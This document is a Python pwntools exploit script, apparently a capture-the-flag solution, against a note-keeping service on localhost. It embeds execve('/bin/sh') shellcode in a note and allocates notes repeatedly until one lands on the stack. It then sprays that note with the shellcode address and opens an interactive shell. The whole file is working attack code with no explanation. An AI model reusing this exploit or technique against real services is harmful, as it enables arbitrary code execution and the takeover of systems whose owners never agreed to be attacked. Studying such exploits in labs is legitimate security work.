from pwn import *


class NoteExploit:
    EXECVE_BIN_SH_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
    STACK_BOTTOM_ADDRESS = 0xffffdc00
    STACK_EXPANSION_BYTES = 0x430
    PAGE_SIZE_BYTES = 4096

    def __init__(self):
        self.shell = remote('localhost', 9019)
        self.current_stack_address = self.STACK_BOTTOM_ADDRESS
        self.shellcode_address = 0

    def update_stack_expansion(self):
        self.current_stack_address -= self.STACK_EXPANSION_BYTES

    def create_note(self):
        self.update_stack_expansion()
        self.shell.sendlineafter("exit", "1")
        note_number = int(self.shell.recvline_contains("note created").split()[-1])
        note_address = int(self.shell.recvline()[2:10], base=16)
        print("Received note number:", note_number)
        print("in address", hex(note_address))
        return note_number, note_address

    def write_note(self, note_number, content):
        self.update_stack_expansion()
        self.shell.sendlineafter("exit", "2")
        self.shell.sendlineafter("note no", str(note_number))
        self.shell.sendlineafter("paste your note", content)

    def delete_note(self, note_number):
        self.update_stack_expansion()
        self.shell.sendlineafter("exit", "4")
        self.shell.sendlineafter("note no", str(note_number))

    def exit_program(self):
        self.update_stack_expansion()
        self.shell.sendlineafter("exit", "5")

    def spray_second_note_with_shellcode_address(self):
        self.write_note(1, p32(self.shellcode_address) * (self.PAGE_SIZE_BYTES // 4))
        print("Spraying the second note (on the stack) with the shellcode address in order to redirect execution")

    def create_notes_until_reached_stack(self):
        while True:
            note_number, note_address = self.create_note()
            if self.current_stack_address <= note_address <= self.STACK_BOTTOM_ADDRESS:
                print("Created note on stack, note address is:", hex(note_address))
                return
            self.delete_note(note_number)

    def place_shellcode_in_first_note(self):
        note_number, note_address = self.create_note()
        self.shellcode_address = note_address
        self.write_note(note_number, self.EXECVE_BIN_SH_SHELLCODE)
        print("Shellcode placed in first note in address:", hex(self.shellcode_address))

    def run(self):
        self.place_shellcode_in_first_note()
        self.create_notes_until_reached_stack()
        self.spray_second_note_with_shellcode_address()
        self.exit_program()
        self.shell.interactive()


if __name__ == '__main__':
    NoteExploit().run()
